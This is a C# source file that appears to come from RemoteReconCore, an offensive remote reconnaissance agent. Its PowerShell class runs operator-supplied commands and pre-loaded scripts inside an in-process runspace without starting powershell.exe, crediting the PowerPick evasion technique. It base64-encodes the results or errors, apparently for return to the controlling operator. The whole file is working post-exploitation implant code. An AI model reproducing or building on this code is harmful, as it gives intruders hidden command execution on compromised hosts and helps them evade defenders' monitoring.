using System;
using System.Collections.Generic;
using System.Text;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Collections.ObjectModel;

namespace RemoteReconCore
{
    public class PowerShell : IJobs
    {
        private string cmd;
        public PowerShell(string command)
        {
            cmd = command;
        }

        //Some of @sixdub's code from PowerPick used here.
        public KeyValuePair<int, string> Run()
        {
            try
            {
                Runspace runspace = RunspaceFactory.CreateRunspace();
                runspace.Open();
                RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
                Pipeline pipeline = runspace.CreatePipeline();
#if DEBUG
                Console.WriteLine("Created Runspace");
#endif

                //check if there is a script loaded
#if DEBUG
                Console.WriteLine("Loaded script length: " + Agent.loadedScript.Length);
#endif
                if (Agent.loadedScript.Length != 0)
                    pipeline.Commands.AddScript(Agent.loadedScript.ToString());

                //Adding command
                pipeline.Commands.AddScript(cmd);
#if DEBUG
                Console.WriteLine("Executing PowerShell Command");
#endif
                //Get output 
                pipeline.Commands.Add("Out-String");
                Collection<PSObject> results = pipeline.Invoke();
                runspace.Close();

                //Convert to string
                StringBuilder resultString = new StringBuilder();
                foreach (PSObject obj in results)
                {
                    resultString.Append(obj);
                }

                string enc = Convert.ToBase64String(Encoding.ASCII.GetBytes(resultString.ToString().Trim()));
                return new KeyValuePair<int, string>(0, enc);
            }
            catch (Exception e)
            {
                string msg = Convert.ToBase64String(Encoding.ASCII.GetBytes(e.ToString()));
                return new KeyValuePair<int, string>(5, msg);
            }
        }
    }
}
